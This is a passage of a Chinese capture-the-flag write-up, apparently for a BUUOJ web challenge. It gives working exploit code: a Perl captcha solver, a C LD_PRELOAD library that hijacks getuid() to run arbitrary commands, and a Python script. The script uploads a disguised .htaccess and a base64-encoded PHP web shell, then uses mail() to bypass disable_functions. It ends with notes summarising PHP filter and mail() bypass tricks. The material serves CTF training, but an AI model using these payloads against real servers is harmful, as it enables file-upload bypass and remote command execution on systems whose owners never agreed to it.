#!/usr/bin/env perl 
use warnings;
use strict;
use IPC::Open2;

$| = 1;
chdir "/"; #!!!!!!!!!!!!!!!!!!!!!!!!!!

my $pid = open2(\*out2, \*in2, './get_flag') or die;

my $reply = <out2>;
print STDOUT $reply; #string: solve captcha..
$reply = <out2>;
print STDOUT $reply; #captcha formula

my $answer = eval($reply);
print STDOUT "answer: $answer\n"; 

print in2 " $answer "; #send it to process
in2->flush();

$reply = <out2>;
print STDOUT $reply; #flag :D
```

发现上传文件这一块直接用脚本不太好使, 用 mail() 函数绕过

> PHP的 `mail()` 函数调用 `execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], ...)` 。由于这种实现，如果我们使用自写动态库设置环境变量 `LD_PRELOAD` ，从而修改 `/bin/sh` 的行为并获得命令执行。 

即使 `/usr/sbin/sendmail` 不存在, 也可以使用, 重写 `getuid()` 函数

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
  char buf[512];
  strcpy(buf, cmd);
  strcat(buf, " > /tmp/_0utput.txt");
  system(buf);}

int getuid() {
  char *cmd;
  if (getenv("LD_PRELOAD") == NULL) { return 0; }
  unsetenv("LD_PRELOAD");
  if ((cmd = getenv("_evilcmd")) != NULL) {
    payload(cmd);
  }
  return 1;
}
```

编译

```
gcc -Wall -fPIC -shared -o evil.so evil.c -ldl
```

采用 `move_uploaded_file` 函数进行多文件上传, 最后的 python 脚本如下

```python
#!/usr/bin/env python3
# -*-coding:utf-8-*-

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://38f0cae3-850b-4ce3-b8ab-7f368b745941.node3.buuoj.cn/"
RANDOM_DIRECTORY = "4b908db0cb4511f942feb821a226ba66c216daad"  # 上传后刷新查到目录再进行修改

COOKIES = {
    "PHPSESSID": "e2s5o4f9dud4rjesdovgmgf877"}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .ricky
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.ricky"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php

// Upload the solver and shared library
move_uploaded_file($_FILES['captcha_solver']['tmp_name'], '/tmp/captcha_solver');
move_uploaded_file($_FILES['evil']['tmp_name'], '/tmp/evil_lib');

// Set the captcha_solver as executable
putenv('LD_PRELOAD=/tmp/evil_lib');
putenv("_evilcmd=chmod +x /tmp/captcha_solver");
mail('a','a','a');

// Run the captcha solver
putenv("_evilcmd=cd / && /tmp/captcha_solver");
mail('a','a','a');

// Print output
echo file_get_contents('/tmp/_0utput.txt');
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.ricky", TARGET_FILE)
upload_content("trigger.ricky", VALID_WBMP)

files = {"evil": open("./evil.so", "rb"), "captcha_solver": open("./exploit.pl", "rb")}
response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.ricky", files=files)
print(response.text)
```

结果

![20210422183028423](https://raw.githubusercontent.com/Ricky-369369/Rickyweb/main/Nepnep/Probation/img/20210422183028423.png)

## 小结

- php过滤器

iconv|UCS|UTF|rot|quoted|base64|zlib.deflate|zlib.inflate|toupper|tolower|strip_tags

- file_get_contents() 与 include() 包含 data url 的区别 

- mail() 函数绕过 disable_functions